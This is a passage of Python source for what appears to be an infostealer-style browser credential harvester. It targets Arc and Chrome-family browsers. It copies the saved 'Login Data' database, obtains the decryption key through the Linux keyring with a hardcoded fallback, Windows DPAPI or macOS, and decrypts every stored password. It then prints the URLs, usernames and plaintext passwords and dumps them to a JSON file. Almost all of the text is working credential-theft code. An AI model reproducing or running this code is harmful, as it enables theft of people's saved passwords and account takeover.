            os.path.join(browser_path, "Local State"),        # In the profile
            os.path.join(os.path.dirname(os.path.dirname(browser_path)), "Local State")  # Two levels up
        ]
        
        for path in potential_paths:
            if os.path.exists(path):
                return path
                
        return None
        
    def _load_json_file(self, file_path):
        """Load and parse a JSON file with encoding fallbacks"""
        try:
            # Try UTF-8 first
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except UnicodeDecodeError:
            # Try binary mode with Latin-1 if UTF-8 fails
            try:
                with open(file_path, 'rb') as f:
                    return json.loads(f.read().decode('latin-1', errors='replace'))
            except Exception:
                return None
        except Exception:
            return None
            
    def _get_encryption_key_linux(self):
        """Get the encryption key on Linux"""
        try:
            # Try to use secretstorage if available
            try:
                import secretstorage
                
                # Connect to the Secret Service
                connection = secretstorage.dbus_init()
                collection = secretstorage.get_default_collection(connection)
                
                # Try different possible key names
                service_names = [
                    "Arc Safe Storage", 
                    "Arc", 
                    "Thorium Safe Storage", 
                    "Chrome Safe Storage", 
                    "Chromium Safe Storage"
                ]
                
                for service in service_names:
                    for item in collection.search_items({"application": service}):
                        secret = item.get_secret()
                        return hashlib.pbkdf2_hmac(
                            'sha1', 
                            secret, 
                            b'saltysalt',  # Fixed salt
                            iterations=1,  # Linux uses 1 iteration
                            dklen=16  # 128-bit AES key
                        )
            except ImportError:
                pass  # secretstorage not available
            
            # Fallback to default key
            return hashlib.pbkdf2_hmac(
                'sha1', 
                b'peanuts',  # Default password when no keyring available
                b'saltysalt', 
                iterations=1, 
                dklen=16
            )
                
        except Exception:
            return None

    def decrypt_password(self, encrypted_password, key):
        """
        Decrypt browser password data using the provided encryption key.
        
        Args:
            encrypted_password (bytes): The encrypted password data
            key (bytes): The decryption key
            
        Returns:
            str: The decrypted password as a string, or None if decryption fails
        """
        # Guard clause - return early if we don't have valid input
        if not encrypted_password or not key:
            return None
            
        try:
            # Choose decryption method based on operating system
            if platform.system() == "Darwin":  # macOS
                return self._decrypt_password_macos(encrypted_password, key)
            elif platform.system() == "Windows":
                return self._decrypt_password_windows(encrypted_password, key)
            elif platform.system() == "Linux":
                return self._decrypt_password_linux(encrypted_password, key)
            
            return None
            
        except Exception:
            return None
            
    def _decrypt_password_macos(self, encrypted_password, key):
        """Handle macOS-specific password decryption"""
        if not encrypted_password:
            return ""
            
        # Try modern AES-GCM method (Chrome v80+)
        if len(encrypted_password) > 3 and encrypted_password[:3] in (b'v10', b'v11'):
            try:
                # Extract nonce and ciphertext
                nonce = encrypted_password[3:15]
                ciphertext_with_tag = encrypted_password[15:]
                
                # Decrypt using AES-GCM
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                aesgcm = AESGCM(key)
                decrypted = aesgcm.decrypt(nonce, ciphertext_with_tag, None)
                return self._clean_decrypted_password(decrypted)
            except Exception:
                pass  # Fall through to legacy method
        
        # Try legacy AES-CBC method
        try:
            from Crypto.Cipher import AES
            iv = b' ' * 16  # Standard IV for Chrome
            
            # Remove version prefix if present
            enc_passwd = encrypted_password[3:] if len(encrypted_password) > 3 else encrypted_password
            cipher = AES.new(key, AES.MODE_CBC, IV=iv)
            decrypted = cipher.decrypt(enc_passwd)
            return self._clean_decrypted_password(decrypted)
        except Exception:
            return ""
    
    def _decrypt_password_windows(self, encrypted_password, key):
        """Handle Windows-specific password decryption"""
        try:
            # Modern Chrome/Arc browsers use AES-GCM (v10/v11 format)
            if len(encrypted_password) > 3 and encrypted_password[:3] in (b'v10', b'v11'):
                # Extract components
                nonce = encrypted_password[3:15]
                ciphertext_with_tag = encrypted_password[15:]
                
                try:
                    # Try high-level AESGCM API first
                    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                    aesgcm = AESGCM(key)
                    decrypted = aesgcm.decrypt(nonce, ciphertext_with_tag, None)
                except Exception:
                    # Fall back to manual GCM implementation
                    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                    from cryptography.hazmat.backends import default_backend
                    
                    # Ensure we have enough data for tag
                    if len(ciphertext_with_tag) < 16:
                        return None
                        
                    # Split ciphertext and authentication tag
                    tag = ciphertext_with_tag[-16:]
                    ciphertext = ciphertext_with_tag[:-16]
                    
                    # Decrypt with explicit GCM parameters
                    cipher = Cipher(
                        algorithms.AES(key),
                        modes.GCM(nonce, tag),
                        backend=default_backend()
                    )
                    decryptor = cipher.decryptor()
                    decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Older Chrome/Arc versions use Windows DPAPI directly
            else:
                import win32crypt
                decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
            
            return self._clean_decrypted_password(decrypted)
            
        except Exception:
            # Last resort: try to decode as-is
            try:
                return encrypted_password.decode('utf-8', errors='replace')
            except:
                return None
    
    def _decrypt_password_linux(self, encrypted_password, key):
        """Handle Linux-specific password decryption"""
        # Try modern AES-GCM method first
        if len(encrypted_password) > 3 and encrypted_password[:3] in (b'v10', b'v11'):
            try:
                # Extract components
                nonce = encrypted_password[3:15]
                ciphertext_with_tag = encrypted_password[15:]
                
                # Decrypt using AES-GCM
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                aesgcm = AESGCM(key)
                decrypted = aesgcm.decrypt(nonce, ciphertext_with_tag, None)
                return self._clean_decrypted_password(decrypted)
            except Exception:
                pass  # Fall through to legacy method
        
        # Try legacy AES-CBC method
        try:
            from Crypto.Cipher import AES
            iv = b' ' * 16
            
            # Remove version prefix if present
            enc_passwd = encrypted_password[3:] if len(encrypted_password) > 3 else encrypted_password
            cipher = AES.new(key, AES.MODE_CBC, IV=iv)
            decrypted = cipher.decrypt(enc_passwd)
            return self._clean_decrypted_password(decrypted)
        except Exception:
            return None
    
    def _clean_decrypted_password(self, decrypted_bytes):
        """
        Clean and format decrypted password bytes into a usable string
        
        Args:
            decrypted_bytes (bytes): Raw decrypted password data
            
        Returns:
            str: Cleaned password string
        """
        # Filter out non-printable characters
        clean_bytes = bytes(b for b in decrypted_bytes if 32 <= b <= 126 or b in (9, 10, 13))
        
        # Convert to string, handling invalid UTF-8
        cleaned_str = clean_bytes.decode('utf-8', errors='replace')
        
        # Remove trailing nulls and whitespace
        cleaned_str = cleaned_str.rstrip('\0 \t\r\n')
        
        return cleaned_str

    def get_credentials(self):
        """
        Get stored credentials from the Arc browser.
        Returns a list of dictionaries with keys 'url', 'username', 'password'.
        """
        try:
            db_path = self.get_browser_paths()[0][0] + "/Login Data"
    
            if not os.path.exists(db_path):
                print(f"Login Data file not found at: {db_path}")
                return []
    
            temp_db_path = self._copy_db_file(db_path)
            if not temp_db_path:
                print("Failed to create temporary copy of Login Data file")
                return []
    
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
    
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            results = cursor.fetchall()
    
            decryption_key = self.get_encryption_key(db_path)
            credentials = []
            
            for row in results:
                origin_url, username, encrypted_password = row
                
                # Try to decrypt the password
                decrypted_password = self.decrypt_password(encrypted_password, decryption_key)
                
                # Only add credentials with valid data
                if username or decrypted_password:
                    credential = {
                        'url': origin_url,
                        'username': username,
                        'password': decrypted_password if decrypted_password else 'Failed to decrypt'
                    }
                    credentials.append(credential)
                    
                    print(f"URL: {origin_url}")
                    print(f"Username: {username}")
                    print(f"Password: {decrypted_password}")
            
            # Clean up temporary database
            if os.path.exists(temp_db_path):
                os.remove(temp_db_path)
                
            return credentials
        except Exception as e:
            print(f"Error extracting credentials: {e}")
            return []
            
    def harvest_data(self):
        """
        Harvest all available data from Arc browser.
        
        Returns:
            dict: Dictionary containing all the extracted data in the expected format
        """
        credentials = self.get_credentials()
        
        # Format the data to match the expected JSON structure
        return {
            'passwords': credentials,
            'history': {'data': []},  # Add empty placeholder for now
            'bookmarks': {'data': []},
            'downloads': {'data': []},
            'cookies': {'data': []},
            'count': len(credentials)
        }


class BrowserDataHarvester:
    """
    Extract saved credentials from common web browsers.
    
    Supports Chrome, Firefox, Edge, and Brave across multiple platforms.
    """
    
    def __init__(self):
        """Initialize the browser data harvester"""
        self.system = platform.system()
        self.temp_dir = tempfile.mkdtemp()
        self.results = {
            'passwords': {'data': []},
            'history': {'data': []},
            'cookies': {'data': []},
            'downloads': {'data': []},
            'credit_cards': {'data': []},
            'bookmarks': {'data': []},
        }
        self.browser_instances = {}
        
        # Initialize browser extractors
        try:
            # self.browser_instances['chrome'] = ChromeBrowser()
            self.browser_instances['arc'] = ArcBrowser()
            # self.browser_instances['firefox'] = FirefoxBrowser()
            # self.browser_instances['edge'] = EdgeBrowser()
        except Exception as e:
            print(f"Error initializing browser instances: {e}")
    
    def harvest_browser_data(self, browser_name=None):
        """
        Harvest data from specified browser or all available browsers.
        
        Args:
            browser_name: Optional name of browser to harvest from
            
        Returns:
            dict: Combined results from all harvested browsers
        """
        if browser_name and browser_name in self.browser_instances:
            # Harvest from specific browser
            browser = self.browser_instances[browser_name]
            browser_data = browser.harvest_data()
            self.results['passwords'] = browser_data['passwords']
            self.results['history'] = browser_data['history']
            self.results['bookmarks'] = browser_data.get('bookmarks', {'data': []})
            self.results['downloads'] = browser_data.get('downloads', {'data': []})
            self.results['cookies'] = browser_data.get('cookies', {'data': []})
            return self.results
            
        else:
            # Harvest from all available browsers
            for name, browser in self.browser_instances.items():
                browser_data = browser.harvest_data()
                
                # Merge results
                if browser_data.get('passwords', {}).get('data'):
                    self.results['passwords'] = browser_data['passwords']
                    
                if browser_data.get('history', {}).get('data'):
                    self.results['history'] = browser_data['history']
                
                if browser_data.get('bookmarks', {}).get('data'):
                    self.results['bookmarks'] = browser_data['bookmarks']
                
                if browser_data.get('downloads', {}).get('data'):
                    self.results['downloads'] = browser_data['downloads']
                
                if browser_data.get('cookies', {}).get('data'):
                    self.results['cookies'] = browser_data['cookies']
                    
            return self.results
    
    def cleanup(self):
        """Clean up temporary files and resources"""
        try:
            shutil.rmtree(self.temp_dir)
            for browser in self.browser_instances.values():
                browser.cleanup()
        except Exception as e:
            print(f"Error during cleanup: {e}")


def main():
    """
    Main function to extract and save browser credentials.
    
    Extracts passwords and other data from supported browsers,
    saves the results to a JSON file, and displays a summary.
    """
    results = {}
    
    # Create an array of supported browsers to extract from
    browsers_to_extract = [
        {"name": "arc", "class": ArcBrowser, "description": "Arc browser"},
        {"name": "chrome", "class": ChromeBrowser, "description": "Chrome browser"}
    ]
    
    print("\nStarting browser data extraction...")
    
    # Extract data from each supported browser
    for browser in browsers_to_extract:
        name = browser["name"]
        browser_class = browser["class"]
        description = browser["description"]
        
        try:
            print(f"\nExtracting {description} data...")
            browser_instance = browser_class()
            browser_data = browser_instance.harvest_data()
            
            # Determine success based on password count
            password_count = len(browser_data.get('passwords', [])) 
            if 'data' in browser_data.get('passwords', {}):
                password_count = len(browser_data['passwords']['data'])
                
            if password_count > 0:
                print(f"Successfully recovered {password_count} passwords from {description}!")
            else:
                print(f"No passwords found in {description}.")
                
            # Store results
            browser_data['count'] = password_count
            results[name] = browser_data
            
            # Clean up
            browser_instance.cleanup()
            
        except Exception as e:
            print(f"Error extracting {description} data: {e}")
            results[name] = {
                "error": str(e),
                "passwords": [] if name == "arc" else {"data": []},
                "history": {"data": []},
                "bookmarks": {"data": []},
                "downloads": {"data": []},
                "cookies": {"data": []},
                "count": 0
            }
    
    # Save results to JSON file
    try:
        output_file = "browser_data.json"
        with open(output_file, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nSaved browser data to {output_file}")
    except Exception as e:
        print(f"Error saving results to JSON: {e}")
    
    # Print summary report
    print("\n======= Browser Password Recovery Results =======")
    for browser_name, data in results.items():
        if "error" in data:
            print(f"\n{browser_name.capitalize()}: Error - {data['error']}")
        else:
            password_count = data.get("count", 0)
            print(f"\n{browser_name.capitalize()}: Recovered {password_count} passwords")
            
            # Show sample credentials if found
            if password_count > 0:
                print("\nSample credentials:")
                print("=" * 50)
                
                # Handle different data formats between browsers
                if browser_name == "arc":
                    # Arc has a direct password list
                    for i, entry in enumerate(data["passwords"][:3]):  # Show max 3 samples
                        print(f"URL      : {entry['url']}")
                        print(f"Username : {entry['username']}")
                        print(f"Password : {entry['password']}")
                        print("-" * 50)
                        if i >= 2:  # Only show 3 samples
                            break
                else:
                    # Chrome and others use 'data' subdictionary
                    for i, entry in enumerate(data["passwords"]["data"][:3]):  # Show max 3 samples
                        print(f"URL      : {entry['url']}")
                        print(f"Username : {entry['username']}")
                        print(f"Password : {entry['password']}")
                        print("-" * 50)
                        if i >= 2:  # Only show 3 samples
                            break
    
    print(f"\nFull details saved to {output_file}")


if __name__ == "__main__":
    main()
                

